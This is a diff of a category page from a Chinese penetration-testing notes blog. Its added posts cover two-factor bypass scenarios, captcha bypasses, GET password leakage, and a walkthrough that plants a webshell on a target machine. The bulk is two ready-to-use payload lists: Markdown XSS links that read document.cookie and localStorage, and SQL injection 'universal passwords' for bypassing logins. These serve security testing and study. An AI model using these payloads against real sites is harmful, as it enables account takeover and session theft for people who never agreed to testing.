@@ -138,28 +138,39 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
-                <a class="clearlink" href="15483045491162.html">
+                <a class="clearlink" href="15591786403220.html">
                 
-                  <h1>burpsuite设置上游代理</h1>
+                  <h1>双因素覆盖不全</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>burpsuite的使用技巧之一，设置上游代理。比如测试境外网站时可能需要[fanqiang]才能访问，此时这个技巧就能用得上了。</p>
+<p>这篇文章引用自【呆子不开口】在SDCC上的关于账号通行证安全相关的PPT。膜拜大佬</p>
 </blockquote>
 
-<p><figure><img src="http://images.lonelyor.org/burp%E8%AE%BE%E7%BD%AE%E4%B8%8A%E6%B8%B8%E4%BB%A3%E7%90%8620180823161146.png" alt="burp设置上游代理20180823161146"/><figcaption>burp设置上游代理201808</figcaption></figure></p>
+<h2 id="toc_0">漏洞原理</h2>
 
-<p>1、在浏览器中设置burp代理以保证可以抓包<br/>
-2、开启上游代理<br/>
-3、在burp的图中所示位置设置上游代理</p>
+<p>双因素后获取的凭证，在无需双因素处可以获得。</p>
 
-<p>打完收工</p>
+<h2 id="toc_1">常见的场景有：</h2>
 
-<h2 id="toc_0">参考链接</h2>
+<p>1、web版登陆需要双因素认证，但app端却没跟上仍然可以用账号密码登陆<br/>
+2、在登陆处需要，在某些特殊功能处却可以通过特殊白名单参数绕过<br/>
+3、某些双因素认证后才能获得的凭证，可以在普通权限下通过某接口中获得</p>
 
-<p><a href="http://www.360zhijia.com/360anquanke/191737.html">http://www.360zhijia.com/360anquanke/191737.html</a></p>
+<p>案例：</p>
+
+<ul>
+<li>淘宝异地登录短信认证绕过</li>
+<li>某微博的双因素认证绕过</li>
+<li>某app移动端登录获取pc端双因素后的cookie</li>
+</ul>
+
+<h2 id="toc_2">修复方案</h2>
+
+<p>双因素认证后需要额外设置新的凭证<br/>
+并保证此凭证不在其他接口输出</p>
 
                         
                       </div>
@@ -168,7 +179,7 @@
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/1/24 12:35 下午</span>
+                    <span class="date">2019/5/30 9:10 上午</span>
                     <span>posted in&nbsp;</span> 
           				  
           					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
@@ -185,127 +196,61 @@
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15483045488670.html">
+                <a class="clearlink" href="15586769387988.html">
                 
-                  <h1>burpsuite如何给数据打标的</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>用特殊字符标记关键字即可</p>
-
-<p>类似的有sqlmap，它是使用参数指定要打标的关键词</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/1/24 12:35 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15483045489194.html">
-                
-                  <h1>Web安全核心</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>核心是攻防</p>
-
-<p>测试备忘录和利用备忘录——攻击<br/>
-防御备忘录和危害备忘录——防御</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/1/24 12:35 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15473524859484.html">
-                
-                  <h1>msf更新</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>1、打开终端输入 msf 进入msfconsole<br/>
-2、在 msfconsole 中输入 msfupdate 即可自动更新</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/1/13 12:8 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15453709108643.html">
-                
-                  <h1>python弱口令脚本的一点备注</h1>
+                  <h1>Markdown XSS Payloads</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>很久以前写的</p>
+<p>在测试某网站富文本编辑器时发现其使用了 markdown，md 会把文本转换成 html，那么肯定存在 xss 的问题，那么如何进行测试呢？于是我搜索了一番，发现前人已经有很好的研究成果了，但是鉴于安全问题的敏感，这里我就不贴原文出处了，不过感谢原作者JakobRPennington的贡献。</p>
 </blockquote>
 
-<p>跑弱口令的脚本<br/>
-不要使用字典这种操作，这不利于跑大量数据的场景。<br/>
-应该制定规则去跑，比如：<br/>
-取出一个用户名，然后根据规则生成弱口令，然后再去匹配用户名对应的密码，匹配则是弱口令，不匹配则不是弱口令。<br/>
-这样可以后续变成一个服务，用户输入密码，触发了规则则告诉他密码是弱口令。</p>
+<p>Links</p>
+
+<pre class="line-numbers"><code class="language-md">[Basic](javascript:alert(&#39;Basic&#39;))
+[Local Storage](javascript:alert(JSON.stringify(localStorage)))
+[CaseInsensitive](JaVaScRiPt:alert(&#39;CaseInsensitive&#39;))
+[URL](javascript://www.google.com%0Aalert(&#39;URL&#39;))
+[In Quotes](&#39;javascript:alert(&quot;InQuotes&quot;)&#39;)
+</code></pre>
+
+<p>Images</p>
+
+<pre class="line-numbers"><code class="language-md">![Escape SRC - onload](https://www.example.com/image.png&quot;onload=&quot;alert(&#39;ImageOnLoad&#39;))
+![Escape SRC - onerror](&quot;onerror=&quot;alert(&#39;ImageOnError&#39;))
+</code></pre>
+
+<p>Fuzzing</p>
+
+<pre class="line-numbers"><code class="language-md">[XSS](javascript:prompt(document.cookie))
+[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
+[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[XSS](&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29)
+[XSS]: (javascript:prompt(document.cookie))
+[XSS](javascript:window.onerror=alert;throw%20document.cookie)
+[XSS](javascript://%0d%0aprompt(1))
+[XSS](javascript://%0d%0aprompt(1);com)
+[XSS](javascript:window.onerror=alert;throw%20document.cookie)
+[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
+[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[XSS](vbscript:alert(document.domain))
+[XSS](javascript:this;alert(1))
+[XSS](javascript:this;alert(1&amp;#41;)
+[XSS](javascript&amp;#58this;alert(1&amp;#41;)
+[XSS](Javas&amp;#99;ript:alert(1&amp;#41;)
+[XSS](Javas%26%2399;ript:alert(1&amp;#41;)
+[XSS](javascript:alert&amp;#65534;(1&amp;#41;)
+[XSS](javascript:confirm(1)
+[XSS](javascript://www.google.com%0Aprompt(1))
+[XSS](javascript://%0d%0aconfirm(1);com)
+[XSS](javascript:window.onerror=confirm;throw%201)
+[XSS](�javascript:alert(document.domain&amp;#41;)
+![XSS](javascript:prompt(document.cookie))\
+![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
+![XSS&#39;&quot;`onerror=prompt(document.cookie)](x)\
+</code></pre>
 
                         
                       </div>
@@ -314,7 +259,7 @@
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2018/12/21 13:41 下午</span>
+                    <span class="date">2019/5/24 13:48 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
           					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
@@ -331,20 +276,14 @@
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15453707290429.html">
+                <a class="clearlink" href="15586660103989.html">
                 
-                  <h1>msf安装与维护</h1>
+                  <h1>使用GET方法传输用户账号密码的危害</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<p><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \<br/>
-  chmod 755 msfinstall &amp;&amp; \<br/>
-  ./msfinstall</code></p>
-
-<p>上面是官方提供的一键安装脚本</p>
-
-<p>使用msfupdate可以进行更新</p>
+                        	<p>通过 Get 方式提交数据时，用户名和密码将出现在 URL 上，如果页面可以被缓存（浏览器缓存、cdn 缓存、服务器缓存、中间件日志缓存等）或者其他人可以访问客户这台机器，就可以从历史记录获得该用户的帐号和密码，所以表单提交建议使用 Post 方法。</p>
 
                         
                       </div>
@@ -353,7 +292,210 @@
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2018/12/21 13:38 下午</span>
+                    <span class="date">2019/5/24 10:46 上午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15586605529996.html">
+                
+                  <h1>验证码安全</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>由于业务迭代频繁，产品线众多...好了不废话了。简单来说就是很多网站的登录界面没有验证码，只有账号密码输入框，这样不安全。</p>
+
+<h2 id="toc_0">什么是验证码</h2>
+
+<p>全自动区分计算机和人类的图灵测试（Completely Automated Public Turing test to tell Computers and Humans Apart，简称CAPTCHA），俗称验证码，是一种区分用户是计算机或人的全自动化程序。</p>
+
+<h2 id="toc_1">验证码种类</h2>
+
+<p>1、图形验证码<br/>
+2、滑动验证码（比如极验）<br/>
+3、答题验证码<br/>
+4、手机短信/邮箱验证码<br/>
+5、动态口令</p>
+
+<h2 id="toc_2">验证码的作用</h2>
+
+<p>人机识别：识别使用对应功能的是人还是机器。<br/>
+防止机器暴力攻击：防止攻击者在短时间内用机器进行批量操作（常见功能场景如：登录）。</p>
+
+<h2 id="toc_3">验证码工作原理</h2>
+
+<p><figure><img src="media/15586605529996/15586616406956.jpg" alt=""/></figure></p>
+
+<h2 id="toc_4">验证码常用场景与作用</h2>
+
+<p>登录接口常使用验证码来防御攻击者的撞库攻击<br/>
+注册接口常用验证码来防御批量恶意注册<br/>
+身份认证<br/>
+重要表单提交<br/>
+修改密码<br/>
+支付等功能</p>
+
+<h2 id="toc_5">验证码使用</h2>
+
+<p>重要接口要加验证码<br/>
+常见的如登录、注册等接口推荐使用滑动验证码；重要的如改密、支付等功能推荐使用手机短信验证码；vpn登录、身份认证等推荐使用动态口令。</p>
+
+<h2 id="toc_6">验证码对抗技术</h2>
+
+<p>1、OCR 识别图形验证码<br/>
+2、机器识别验证码（常见流程：去噪处理-图像二值化-切片处理-文件图片标准化-字符模板识别）<br/>
+3、LTE／4G 伪基站＋GSM 中间人攻击实现手机短信验证码攻击（相关安全事件可见&quot;这下一无所有了&quot;：<a href="http://netsecurity.51cto.com/art/201808/580812.htm%EF%BC%89">http://netsecurity.51cto.com/art/201808/580812.htm）</a><br/>
+4、验证码流程绕过（空验证码、返回包含验证码、验证码固定、验证码前端校验、验证流程有误）<br/>
+5、人工打码平台</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/5/24 9:15 上午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15585815946395.html">
+                
+                  <h1>万能密码</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>内容收集自网络，是否有效并未验证<br/>
+原文链接：<a href="https://blog.csdn.net/u012804180/article/details/51932863">asp、aspx、php、jsp万能密码大全</a></p>
+</blockquote>
+
+<p>-------asp万能密码 <br/>
+      &#39;or&#39;=&#39;or&#39;</p>
+
+<p>--------aspx万能密码<br/>
+   1： &quot;or &quot;a&quot;=&quot;a<br/>
+   2： &#39;)or(&#39;a&#39;=&#39;a<br/>
+   3：or 1=1--<br/>
+   4：&#39;or 1=1--<br/>
+   5：a&#39;or&#39; 1=1--<br/>
+   6： &quot;or 1=1--<br/>
+   7：&#39;or&#39;a&#39;=&#39;a<br/>
+   8： &quot;or&quot;=&quot;a&#39;=&#39;a<br/>
+   9：&#39;or&#39;&#39;=&#39;<br/>
+   10：&#39;or&#39;=&#39;or&#39;<br/>
+   11: 1 or &#39;1&#39;=&#39;1&#39;=1<br/>
+   12: 1 or &#39;1&#39;=&#39;1&#39; or 1=1<br/>
+   13: &#39;OR 1=1%00<br/>
+   14: &quot;or 1=1%00<br/>
+   15: &#39;xor<br/>
+   16: 新型万能登陆密码</p>
+
+<p>   用户名 &#39; UNION Select 1,1,1 FROM admin Where &#39;&#39;=&#39; （替换表名admin）<br/>
+   密码 1<br/>
+   Username=-1%cf&#39; union select 1,1,1 as password,1,1,1 %23<br/>
+   Password=1</p>
+
+<p>   17..admin&#39; or &#39;a&#39;=&#39;a 密码随便<br/>
+ <br/>
+--------PHP万能密码<br/>
+   &#39;or&#39;=&#39;or&#39;<br/>
+   &#39;or 1=1/*  字符型 GPC是否开都可以使用</p>
+
+<p>   User: something<br/>
+   Pass: &#39; OR &#39;1&#39;=&#39;1</p>
+
+<p> <br/>
+--------jsp 万能密码<br/>
+   1&#39;or&#39;1&#39;=&#39;1<br/>
+   admin&#39; OR 1=1/*<br/>
+ <br/>
+   用户名：admin    系统存在这个用户的时候 才用得上<br/>
+   <br/>
+   密码：1&#39;or&#39;1&#39;=&#39;1</p>
+
+<hr/>
+
+<p>作者：xss_01 <br/>
+来源：CSDN <br/>
+原文：<a href="https://blog.csdn.net/u012804180/article/details/51932863">https://blog.csdn.net/u012804180/article/details/51932863</a> <br/>
+版权声明：本文为博主原创文章，转载请附上博文链接！</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/5/23 11:19 上午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15554000328653.html">
+                
+                  <h1>最近遇到的一个靶机</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>1、查看 http 流量，后台扫描等进行信息收集，得出其用的是 xxxxcms，然后百度进一步进行信息收集，得出该 cms 存在过 sql 注入、文件包含等漏洞。<br/>
+2、全站测试 sql 注入，发现确实存在注入点<br/>
+3、上 sqlmap 进行扫描，得出管理员账号密码，得出 mysql 为普通用户权限。<br/>
+4、登录网站后台，利用文件包含漏洞获取部分.php 文件信息，对其进行编辑写入小马。（这块之前没怎么玩过，因此稍微花费了一点时间，目的达到了，不过不优雅）<br/>
+5、通过小马传入大马，然后连接大马。<br/>
+6、提权拿 linux 的 root，这里我不太懂，因此正在找资料，希望今晚能搞定提权这事。</p>
+
+<p>提权这块研究一下，搞出来了再写。目前的思路是通过 shell 查看操作系统版本和内核版本，查看已安装的包和程序，看看有没有一直漏洞可以利用。</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/4/16 15:33 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
           					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
@@ -454,31 +596,31 @@
 	      
 		      
 			      <li class="post">
-			        <a href="15578813198735.html">家思</a>
+			        <a href="15642124072307.html">Mutillidae 遇到的一个奇怪问题</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15577346001597.html">linux 敏感目录</a>
+			        <a href="15641083818915.html">manjaro更改国内源操作</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15573021402615.html">Mac 上的 svnGUI 工具：smartsvn 安装、激活和使用</a>
+			        <a href="15640473747565.html">kali 下更新软件时报错，说下列签名无效的解决办法</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15572001451538.html">c 语言中变量前面加`*`表示什么？如`*`p</a>
+			        <a href="15638711886127.html">Archiso</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15554899648347.html">CEO、COO、CFO、CIO、CTO、CMO的中文是什么?</a>
+			        <a href="15611953556975.html">archlinux 安装 vmtools 遇到坑了怎么办</a>
 			      </li>
 		     
 		  
